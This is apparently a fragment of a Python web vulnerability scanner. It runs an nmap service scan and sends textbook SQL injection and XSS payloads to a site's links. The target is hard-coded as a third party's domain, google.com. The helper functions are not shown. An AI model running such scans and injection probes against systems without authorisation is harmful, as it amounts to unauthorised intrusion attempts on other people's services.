def main():
    url = "https://google.com"
    if not is_url_valid(url):
        print("Invalid URL. Exiting...")
        return

    # Perform a vulnerability scan using Nmap
    nmap_scan = subprocess.Popen(["nmap", "-sV", "-p", "1-1000", url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = nmap_scan.communicate()
    if nmap_scan.returncode != 0:
        print(f"Error running Nmap scan: {stderr.decode('utf-8')}")
    else:
        print(f"Nmap scan results:\n{stdout.decode('utf-8')}")

    # Perform SQL injection and XSS vulnerability scans
    payloads = [
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' AND 1=1 --",
        "' AND 1=1 #"
    ]

    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>"
    ]

    links = get_links(url)
    print(f"Found {len(links)} links:")
    for link in links:
        print(link)

    print("\nStarting vulnerability scan...")
    scan_for_injection_vulnerabilities(url, payloads)
    scan_for_xss_vulnerabilities(url, xss_payloads)
